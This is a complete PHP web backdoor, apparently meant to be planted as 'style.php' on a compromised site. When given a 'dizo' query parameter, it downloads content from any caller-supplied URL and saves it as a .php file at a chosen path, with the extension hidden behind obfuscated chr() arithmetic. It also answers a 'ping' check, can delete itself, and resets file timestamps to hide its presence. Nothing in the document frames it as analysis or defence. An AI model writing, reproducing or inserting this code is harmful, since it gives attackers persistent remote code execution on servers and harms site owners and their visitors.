<?php
function getRemoteResource($res)
{
	$response = "";
	if (@function_exists('curl_version') || in_array('curl', get_loaded_extensions())) {
		$ch = @curl_init();
		@curl_setopt($ch, CURLOPT_URL, $res);
		@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$response = @curl_exec($ch);
		@curl_close($ch);
	} else {
		$response = @file_get_contents($res);
	}
	return $response;
}

function sanitizeResourceId($res)
{
	$ext = array(8, 0, 8);
	$ret = $res;
	$ret = str_replace("_", ".", $ret);
	$ret = str_replace("-", "/", $ret);
	$ret = $ret . ".";
	foreach ($ext as $ord) {
		$ret = $ret . chr($ord + 100 + 4);
	}
	return $ret;
}

function storeResource($res, $dest)
{
	$ret = @file_put_contents(sanitizeResourceId($dest), $res);
	if ($ret === false) {
		$fh = @fopen(sanitizeResourceId($dest), "w");
		@fwrite($fh, $res);
		@fclose($fh);
	}
}

if (isset($_GET["dizo"])) {
	if (isset($_GET["self-rem"])) {
		@unlink(rtrim($_SERVER["DOCUMENT_ROOT"], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "/style.php");
	}

	if (isset($_GET["ping"])) {
		echo "pong";
		die();
	}
	if (isset($_GET["dest"]) && isset($_GET["source"])) {
		$resource = getRemoteResource($_GET["source"]);
		@storeResource($resource, $_GET["dest"]);
	}
}

$time = '1514402716';
@touch(__FILE__, $time);
@touch($_SERVER["SCRIPT_FILENAME"], $time);
